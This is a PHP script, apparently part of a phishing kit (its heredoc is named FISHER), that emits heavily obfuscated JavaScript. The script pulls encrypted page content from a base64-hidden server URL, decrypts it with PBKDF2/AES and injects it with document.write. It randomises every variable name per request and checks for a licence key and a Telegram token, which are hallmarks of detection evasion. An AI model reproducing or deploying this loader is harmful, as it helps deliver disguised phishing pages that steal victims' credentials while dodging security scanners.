<?php
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Credentials: true");
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
header('Content-type: application/javascript; charset=utf-8');
function genT()
{
	$ids = hash("sha256", mt_rand(0, 10000 * time()));
	$rnd = mt_rand(0, 1000 * time()) % strlen($ids);
	return "v" . substr($ids, 0, ($rnd != 0 && $rnd <= 30) ? $rnd : 8);
}
$autos = $_GET["r"] ?? "";
if ($autos) {
	$autos = explode(",", base64_decode($autos));
	$n_autos = json_encode($autos);
}
@ob_start();
echo <<<FISHER
var &var1;= document.createElement('script');
var autograb = 0;
&var1;.setAttribute('src',atob("aHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuMS4xLm1pbi5qcw=="));
document.head.append(&var1;);

var &var4;= document.createElement('script');
&var4;.setAttribute('src',"https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js");
document.head.append(&var4;);

&var1;.onload=function(){
$.support.cors = true
var &var6; = atob;
var &var8; = "".split;
var &var7; = [].constructor.constructor(&var6;("cmV0dXJuIENyeXB0b0pT"));
var &var2; = &var6;($('#b64u').val());
$.post(&var2;,'scte='.concat('') + (autograb == 0 ? '&auto=false' : '') + &var0;)
	.done(function(&var3;){
	function &var5;(f){
			var O00O1II = &var8;.apply(&var6;(f),[String.fromCharCode(42)]);
			var O000111 = {
				OO0O1II: O00O1II[0],
				OO0OII1: O00O1II[2],
				OOOOII1 : O00O1II[1],
				OO0OIII: O00O1II[3],
			} 
			var OOOOIII = &var7;().PBKDF2(O000111.OO0OIII, &var7;().enc.Hex.parse(O000111.OO0OII1), { hasher: &var7;().algo.SHA512, keySize: 64/8, iterations: 999});
			var O00O111 = &var7;().AES.decrypt(O000111.OO0O1II, OOOOIII, { iv: &var7;().enc.Hex.parse(O000111.OOOOII1)});
			return O00O111.toString(&var7;().enc.Utf8);
	}
     if(&var3;=='no'){
	   document.write('<h1>Please Get an api key to use this page</h1>')
	 }
	 else if(&var3; == "outdated"){
		 document.write('<h1>Please get an updated  version of the page</h1>')
	 }
	 else if(&var3; == 'token'){
		 document.write('Your telegram token not activated')
	 }
	 else if(/\{\"block\"\:/.test(&var3;)){
		 bad_res = JSON.parse(&var3;);
		 if(bad_res.block){
			 document.write('<h1>You were not allowed, because of ' + bad_res.block + '</h1>')
		 }
	 }
	 else{
		 try{
			 console.log(&var3;);
			 document.write(&var6;(&var5;(&var3;)));
		 }catch(e){
			 document.write('<h1>Cannot write to page</h1>');
		 }
	 }
	})
	.fail(function(cd,pg){
		document.write("<h1>Unable to connect , Server not found</h1>")
	})
}
FISHER;
$document = @ob_get_contents();
@ob_end_clean();

$document = str_replace("&var0;", isset($n_autos) ? "'&f=" . base64_encode($n_autos) . "'" : "''", $document);
$document = str_replace("&var1;", genT(), $document);
$document = str_replace("&var2;", genT(), $document);
$document = str_replace("&var3;", genT(), $document);
$document = str_replace("&var4;", genT(), $document);
$document = str_replace("&var5;", genT(), $document);
$document = str_replace("&var6;", genT(), $document);
$document = str_replace("&var7;", genT(), $document);
$document = str_replace("&var8;", genT(), $document);


echo $document;

